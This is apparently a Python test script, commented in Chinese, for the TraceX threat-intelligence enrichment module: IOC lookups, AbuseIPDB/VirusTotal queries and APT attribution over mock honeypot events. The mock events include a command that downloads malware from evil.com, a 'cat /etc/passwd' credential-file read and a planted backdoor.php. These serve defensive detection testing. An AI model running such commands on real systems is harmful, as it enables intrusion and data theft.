# tests/test_enrichment_api.py
"""
情报富化模块测试脚本

测试内容：
1. 本地模拟数据查询
2. 外部 API 查询（AbuseIPDB / VirusTotal）
3. APT 归因测试

使用方法：
    # 1. 设置 API Key（可选，不设置就只测本地）
    export ABUSEIPDB_API_KEY="你的密钥"
    export VIRUSTOTAL_API_KEY="你的密钥"
    
    # 2. 运行测试
    cd TraceX
    python -m tests.test_enrichment_api

API 注册地址：
    - AbuseIPDB: https://www.abuseipdb.com/register （推荐，免费1000次/天）
    - VirusTotal: https://www.virustotal.com/gui/join-us （免费500次/天）
"""
import sys
import os
import json

# 添加项目根目录到路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from analyzer.graph_analyzer.enrichment import IntelEnricher, ThreatIntelEntry, APTProfile


# ============================================================================
# 已知的恶意 IP（公开情报，API 能查到）
# ============================================================================

# 这些是公开已知的恶意 IP，可以用来测试 API 是否正常工作
KNOWN_MALICIOUS_IPS = [
    "185.220.101.1",    # Tor 出口节点，常被标记
    "45.155.205.233",   # 已知扫描器
    "194.26.29.113",    # 已知恶意 IP
    "91.92.243.110",    # 已知攻击源
    "23.129.64.130",    # Tor 出口节点
]

# 正常的 IP（用于对比）
KNOWN_SAFE_IPS = [
    "8.8.8.8",          # Google DNS
    "1.1.1.1",          # Cloudflare DNS
    "114.114.114.114",  # 国内 DNS
]


# ============================================================================
# 模拟 ECS 格式事件数据
# ============================================================================

def create_mock_events():
    """创建模拟的 ECS 格式事件"""
    
    events = [
        # 事件1：SSH 登录
        {
            "@timestamp": "2026-01-14T10:00:01.000Z",
            "event": {
                "id": "evt-001",
                "category": "authentication",
                "action": "ssh_login",
                "outcome": "success"
            },
            "host": {"name": "honeypot-01"},
            "source": {"ip": "185.220.101.1"},  # 已知恶意 IP
            "user": {"name": "root"}
        },
        
        # 事件2：执行 bash
        {
            "@timestamp": "2026-01-14T10:00:05.000Z",
            "event": {
                "id": "evt-002",
                "category": "process",
                "action": "start"
            },
            "host": {"name": "honeypot-01"},
            "process": {
                "name": "bash",
                "pid": 1234,
                "executable": "/bin/bash",
                "parent": {"pid": 100, "name": "sshd"}
            }
        },
        
        # 事件3：curl 下载
        {
            "@timestamp": "2026-01-14T10:00:10.000Z",
            "event": {
                "id": "evt-003",
                "category": "process",
                "action": "start"
            },
            "host": {"name": "honeypot-01"},
            "process": {
                "name": "curl",
                "pid": 1235,
                "executable": "/usr/bin/curl",
                "command_line": "curl http://evil.com/malware -o /tmp/mal",
                "parent": {"pid": 1234, "name": "bash"}
            },
            "destination": {"ip": "45.155.205.233"}  # 已知恶意 IP
        },
        
        # 事件4：写入临时文件
        {
            "@timestamp": "2026-01-14T10:00:12.000Z",
            "event": {
                "id": "evt-004",
                "category": "file",
                "action": "create"
            },
            "host": {"name": "honeypot-01"},
            "file": {
                "path": "/tmp/mal",
                "name": "mal"
            },
            "process": {"pid": 1235, "name": "curl"}
        },
        
        # 事件5：移动到 web 目录
        {
            "@timestamp": "2026-01-14T10:00:15.000Z",
            "event": {
                "id": "evt-005",
                "category": "file",
                "action": "rename"
            },
            "host": {"name": "honeypot-01"},
            "file": {
                "path": "/var/www/html/backdoor.php",
                "name": "backdoor.php",
                "extension": "php"
            },
            "process": {"pid": 1236, "name": "mv"}
        },
        
        # 事件6：读取敏感文件
        {
            "@timestamp": "2026-01-14T10:00:30.000Z",
            "event": {
                "id": "evt-006",
                "category": "process",
                "action": "start"
            },
            "host": {"name": "honeypot-01"},
            "process": {
                "name": "cat",
                "pid": 1240,
                "executable": "/bin/cat",
                "command_line": "cat /etc/passwd"
            },
            "file": {"path": "/etc/passwd"}
        }
    ]
    
    return events


# ============================================================================
# 测试函数
# ============================================================================

def test_local_ioc_lookup():
    """测试1：本地 IOC 查询"""
    print("\n" + "="*60)
    print("测试1：本地 IOC 查询（不需要 API）")
    print("="*60)
    
    enricher = IntelEnricher(enable_external_api=False)
    
    # 添加你的模拟 C2
    enricher.add_simulated_c2("evil.com", ["C2", "模拟攻击"])
    enricher.add_simulated_attacker_ip("192.168.100.50")
    
    # 测试查询
    test_iocs = ["evil.com", "192.168.100.50", "unknown.com"]
    
    for ioc in test_iocs:
        result = enricher._query_threat_intel(ioc)
        if result:
            print(f"✅ {ioc}: 风险={result.risk_score}, 标签={result.tags}, 来源={result.source}")
        else:
            print(f"❌ {ioc}: 未找到")
    
    return True


def test_external_api():
    """测试2：外部 API 查询"""
    print("\n" + "="*60)
    print("测试2：外部 API 查询")
    print("="*60)
    
    # 检查 API Key
    abuseipdb_key = os.environ.get("ABUSEIPDB_API_KEY", "")
    virustotal_key = os.environ.get("VIRUSTOTAL_API_KEY", "")
    
    if not abuseipdb_key and not virustotal_key:
        print("⚠️ 未设置 API Key，跳过外部 API 测试")
        print("   设置方法：")
        print("   export ABUSEIPDB_API_KEY='你的密钥'")
        print("   export VIRUSTOTAL_API_KEY='你的密钥'")
        return False
    
    enricher = IntelEnricher(
        enable_external_api=True,
        virustotal_api_key=virustotal_key
    )
    
    print(f"\n📡 API 状态:")
    print(f"   AbuseIPDB: {'✅ 已配置' if abuseipdb_key else '❌ 未配置'}")
    print(f"   VirusTotal: {'✅ 已配置' if virustotal_key else '❌ 未配置'}")
    
    print(f"\n🔍 查询已知恶意 IP:")
    for ip in KNOWN_MALICIOUS_IPS[:3]:  # 只测试前3个，节省配额
        result = enricher._query_threat_intel(ip)
        if result:
            print(f"   ✅ {ip}: 风险={result.risk_score}, 标签={result.tags}, 来源={result.source}")
        else:
            print(f"   ❌ {ip}: 查询失败")
    
    print(f"\n🔍 查询正常 IP（对比）:")
    for ip in KNOWN_SAFE_IPS[:2]:
        result = enricher._query_threat_intel(ip)
        if result:
            print(f"   ✅ {ip}: 风险={result.risk_score}, 标签={result.tags}, 来源={result.source}")
        else:
            print(f"   ❌ {ip}: 未找到（正常，说明不在恶意库中）")
    
    return True


def test_apt_attribution():
    """测试3：APT 归因"""
    print("\n" + "="*60)
    print("测试3：APT 归因")
    print("="*60)
    
    enricher = IntelEnricher()
    
    # 测试用的攻击序列
    test_sequences = [
        # 序列1：完全匹配你的模拟剧本
        {
            "name": "完全匹配模拟剧本",
            "sequence": [
                "NETWORK_Inbound",
                "TEMP_FILE_ACCESS",
                "WEB_ROOT_ACCESS",
                "PHP_SCRIPT",
                "SUSPICIOUS_DOWNLOADER",
                "SENSITIVE_FILE"
            ]
        },
        # 序列2：部分匹配（顺序有变化）
        {
            "name": "部分匹配（顺序变化）",
            "sequence": [
                "SSH_CONNECTION",
                "SHELL_EXECUTION",
                "TEMP_FILE_ACCESS",
                "SUSPICIOUS_DOWNLOADER",
                "SENSITIVE_FILE"
            ]
        },
        # 序列3：完全不匹配
        {
            "name": "完全不匹配",
            "sequence": [
                "DNS_QUERY",
                "UNKNOWN_ACTION",
                "RANDOM_STUFF"
            ]
        }
    ]
    
    for test in test_sequences:
        print(f"\n📋 测试: {test['name']}")
        print(f"   序列: {' -> '.join(test['sequence'][:4])}...")
        
        result = enricher.attribute_apt(test["sequence"])
        
        print(f"   结果: {result['suspected_group']}")
        print(f"   相似度: {result['similarity_score']:.0%}")
        print(f"   来源: {result.get('source', 'N/A')}")
        
        if result.get("alternative_matches"):
            print(f"   候选: {[m['group'] + f'({m[\"score\"]:.0%})' for m in result['alternative_matches']]}")
    
    return True


def test_full_pipeline():
    """测试4：完整流程（模拟真实使用）"""
    print("\n" + "="*60)
    print("测试4：完整流程")
    print("="*60)
    
    from analyzer.graph_analyzer.atlas_mapper import AtlasMapper
    
    enricher = IntelEnricher(enable_external_api=False)
    mapper = AtlasMapper()
    
    # 添加模拟数据
    enricher.add_simulated_c2("evil.com", ["C2", "CobaltStrike"])
    enricher.add_simulated_attacker_ip("185.220.101.1")
    
    # 创建模拟事件
    events = create_mock_events()
    
    print(f"\n📊 处理 {len(events)} 个事件...")
    
    # 生成 ATLAS 标签序列
    path_sequence = []
    iocs_found = set()
    
    for event in events:
        # 生成标签
        label = mapper.get_label(event)
        path_sequence.append(label)
        
        # 提取 IOC
        src_ip = event.get("source", {}).get("ip")
        dst_ip = event.get("destination", {}).get("ip")
        if src_ip:
            iocs_found.add(src_ip)
        if dst_ip:
            iocs_found.add(dst_ip)
    
    print(f"\n🔗 攻击链签名:")
    print(f"   {' -> '.join(path_sequence)}")
    
    print(f"\n🔍 提取到的 IOC:")
    for ioc in iocs_found:
        result = enricher._query_threat_intel(ioc)
        if result:
            status = "⚠️ 恶意" if result.risk_score >= 70 else "✅ 正常"
            print(f"   {status} {ioc}: 风险={result.risk_score}")
        else:
            print(f"   ❓ {ioc}: 未知")
    
    print(f"\n🎯 APT 归因:")
    attribution = enricher.attribute_apt(path_sequence)
    print(f"   疑似组织: {attribution['suspected_group']}")
    print(f"   相似度: {attribution['similarity_score']:.0%}")
    print(f"   来源: {attribution.get('source', 'N/A')}")
    
    return True


def main():
    """运行所有测试"""
    print("="*60)
    print("     TraceX 情报富化模块测试")
    print("="*60)
    
    tests = [
        ("本地 IOC 查询", test_local_ioc_lookup),
        ("外部 API 查询", test_external_api),
        ("APT 归因", test_apt_attribution),
        ("完整流程", test_full_pipeline),
    ]
    
    results = []
    for name, test_func in tests:
        try:
            success = test_func()
            results.append((name, success))
        except Exception as e:
            print(f"\n❌ 测试 {name} 出错: {e}")
            import traceback
            traceback.print_exc()
            results.append((name, False))
    
    # 总结
    print("\n" + "="*60)
    print("测试总结")
    print("="*60)
    for name, success in results:
        status = "✅ 通过" if success else "❌ 跳过/失败"
        print(f"   {status}: {name}")
    
    print("\n💡 提示:")
    print("   1. 本地测试不需要 API Key")
    print("   2. 要测试外部 API，请设置环境变量：")
    print("      export ABUSEIPDB_API_KEY='你的密钥'")
    print("   3. AbuseIPDB 注册: https://www.abuseipdb.com/register")


if __name__ == "__main__":
    main()
